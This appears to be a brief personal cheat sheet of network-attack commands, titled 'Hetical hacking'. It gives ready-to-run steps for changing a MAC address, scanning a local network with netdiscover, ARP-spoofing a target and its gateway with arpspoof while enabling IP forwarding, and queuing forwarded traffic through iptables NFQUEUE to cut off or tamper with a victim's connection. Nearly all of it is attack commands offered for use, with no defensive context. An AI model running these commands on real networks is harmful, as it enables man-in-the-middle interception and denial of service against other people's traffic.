# Hetical hacking
## Change mac address 
```
ip link show
sudo ip link set dev <your device here> down
sudo ip link set dev <your device here> address <your new mac address>
sudo ip link set dev <your device here> up
```
## Netdiscover
Scan all devices connected to a network
```
sudo netdiscover -r ip.start/end
```
## ARP SPOOFING
```
arpspoof -i eth0 -t 10.0.2.7 10.0.2.1
arpspoof -i eth0 -t 10.0.2.1 10.0.2.7

echo 1 > /proc/sys/net/ipv4/ip_forward
sudo bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'
```
## NET CUT
```
sudo iptables -I FORWARD -j NFQUEUE --queue-num 0
pip3 install -U git+https://github.com/kti/python-netfilterqueue
sudo pip3 install -U git+https://github.com/kti/python-netfilterqueue
sudo iptables --flush
```